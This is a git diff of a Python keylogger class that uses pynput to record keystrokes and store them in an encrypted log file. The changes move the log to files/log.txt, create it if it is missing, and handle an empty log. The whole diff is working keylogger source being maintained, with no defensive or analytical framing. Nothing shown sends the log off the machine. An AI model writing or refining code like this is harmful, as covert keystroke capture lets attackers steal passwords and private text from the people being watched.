@@ -1,5 +1,7 @@
+import os
+
 from pynput.keyboard import Key, Listener
-from crypt import Crypt
+from .crypt import Crypt
 from threading import Thread
 
 
@@ -37,18 +39,21 @@ class KeyLogger:
             KeyLogger.count = 0
 
     def read_file(self):
-        with open("log.txt", "rb") as enc_file:
+        if not os.path.exists("files/log.txt"):
+            open("files/log.txt", "x")
+
+        with open("files/log.txt", "rb") as enc_file:
             encrypted_log_byte = enc_file.read()
 
-        decrypted_log_byte = KeyLogger.crypt.decrypt(encrypted_log_byte)
+        if encrypted_log_byte:
+            return KeyLogger.crypt.decrypt(encrypted_log_byte).decode("utf-8")
 
-        return decrypted_log_byte
+        return ""
 
     def write_file(self):
+        final_log = self.read_file() + KeyLogger.keys
 
-        final_log = self.read_file().decode("utf-8") + KeyLogger.keys
-
-        with open("log.txt", "wb") as f:
+        with open("files/log.txt", "wb") as f:
             f.write(KeyLogger.crypt.encrypt(str.encode(final_log)))
 
     def on_release(self, key):
